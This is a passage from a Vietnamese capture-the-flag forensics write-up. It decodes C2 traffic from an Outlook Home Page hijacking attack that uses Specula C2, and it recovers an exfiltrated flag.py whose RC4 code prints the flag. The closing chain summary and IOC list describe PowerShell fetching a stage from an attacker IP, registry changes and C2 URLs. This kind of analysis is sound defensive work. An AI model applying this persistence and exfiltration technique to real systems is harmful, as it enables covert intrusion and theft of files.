D: C:\Users\Public - LastModified: 07/04/2024 19:05:48
```

Đây là bước reconnaissance. Attacker đang duyệt hệ thống file để tìm mục tiêu đáng chú ý.

### Payload 2: Liệt kê thư mục Desktop

```text
Parent Folder: C:/Users/BKISC/Desktop
F: C:\Users\BKISC\Desktop\desktop.ini - Size: 0mb - LastModified: 07/04/2024 19:05:48
F: C:\Users\BKISC\Desktop\flag.py - Size: 0mb - LastModified: 25/07/2025 15:41:41
F: C:\Users\BKISC\Desktop\Obsidian.lnk - Size: 0mb - LastModified: 08/04/2024 08:05:44
F: C:\Users\BKISC\Desktop\Tor Browser.lnk - Size: 0mb - LastModified: 08/04/2024 08:41:37
D: C:\Users\BKISC\Desktop\PS_Transcripts - LastModified: 01/10/2025 02:11:40
```

Đây là bước quyết định, vì từ đây attacker phát hiện ra `flag.py` trên Desktop.

### Payload 3: Nội dung file `flag.py`

Payload tiếp theo chính là nội dung của `flag.py` đã bị exfiltrate:

```python
# Just run the code to get the flag lol

def RC4(key : bytes, plaintext : bytes):
    S = list(range(256))
    j = 0

    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    ciphertext = []
    for char in plaintext:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % 256
        k = S[t]
        ciphertext.append(char ^ k)

    return bytes(ciphertext)

key = b"lookalikechicken"
plaintext = b';fa\x98\xc9\x13\xc8\x89\xda\x04\xed\xb6\x19\x98\xfdgF-\x14S\xa8+\xf50\xc4p\xf90\xb2&j\x081'
print(RC4(key, plaintext).decode())
```

Điểm cần phân biệt rõ:

- ở bước này mình đang giải mã traffic C2 bằng XOR;
- còn đoạn `RC4(...)` nằm bên trong `flag.py`, nghĩa là nó là logic của file bị đánh cắp, không phải logic của giao thức C2.

### Payload 4: Xóa dấu vết

Payload cuối cùng có ý nghĩa:

```text
Delete file: C:\Users\BKISC\Desktop\flag.py - Success!
```

Chuỗi này xác nhận attacker đã:

1. tìm thấy `flag.py`;
2. trích xuất nội dung file;
3. xóa file gốc để phi tang.

Note: Nếu bạn có screenshot output sau khi decrypt payload, có thể chèn thêm ở khu vực này.

## Chạy `flag.py` để lấy flag

Bây giờ mình đã có lại nội dung `flag.py`, nên chỉ cần chạy đúng logic bên trong file đó.

Đoạn mã sử dụng RC4 với:

- key: `lookalikechicken`
- ciphertext: chuỗi bytes hardcode trong biến `plaintext`

Mình dùng script sau:

```python
def RC4(key, plaintext):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    ciphertext = []
    for char in plaintext:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % 256
        k = S[t]
        ciphertext.append(char ^ k)
    return bytes(ciphertext)

key = b"lookalikechicken"
plaintext = b';fa\x98\xc9\x13\xc8\x89\xda\x04\xed\xb6\x19\x98\xfdgF-\x14S\xa8+\xf50\xc4p\xf90\xb2&j\x081'
print(RC4(key, plaintext).decode())
```

Kết quả:

```text
PS D:\CTF\BK\lookout> python .\run_flag.py
Result bytes: 424b4953437b6c306f4b5f4f75375f6630525f307537316f306b5f43322121217d
Decoded: BKISC{l0oK_Ou7_f0R_0u71o0k_C2!!!}
PS D:\CTF\BK\lookout> 
```

## Kết luận

Đây là một chain khá đẹp của Outlook abuse:

1. Nạn nhân mở file hoặc attachment liên quan đến "monthly report";
2. PowerShell tải `report.txt`;
3. `report.txt` chỉnh registry để Outlook Inbox load một trang attacker-controlled;
4. Trang đó chứa VBScript của Specula C2;
5. Malware gửi thông tin máy nạn nhân về server;
6. Server trả về session key và URL C2 mới;
7. Attacker dùng kênh C2 để duyệt filesystem;
8. Attacker phát hiện `flag.py`, exfiltrate nội dung file, rồi xóa file khỏi Desktop;
9. Từ file `flag.py` bị đánh cắp, mình chạy RC4 và lấy lại flag.

Flag cuối cùng là:

```text
BKISC{l0oK_Ou7_f0R_0u71o0k_C2!!!}
```

## IOC và điểm đáng chú ý

- PowerShell tải stage đầu từ:
  `http://192.168.1.189:1704/report.txt`
- Outlook WebView bị trỏ đến:
  `http://192.168.1.189:8386/plugin/search/`
- URL C2 tiếp theo:
  `http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ`
- Session key:
  `o4WlfbKbx1xik1TgTQGeOQ`
- Kỹ thuật:
  Outlook Home Page Hijacking / Specula C2
